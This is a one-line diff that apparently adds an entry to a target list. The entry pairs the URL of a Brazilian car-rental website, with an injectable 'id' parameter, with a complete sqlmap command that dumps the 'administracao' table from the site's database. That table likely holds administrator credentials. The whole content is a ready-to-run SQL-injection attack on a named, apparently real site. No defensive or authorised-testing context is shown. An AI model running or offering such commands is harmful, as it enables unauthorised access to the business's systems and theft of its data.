@@ -1,0 +1,1 @@
+http://www.desttakrentacar.com.br/index.php?secao=noticia&id_editoria=1&id=184 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.desttakrentacar.com.br/index.php?secao=noticia&id_editoria=1&id=184 -D desttakr_site -T administracao --dump
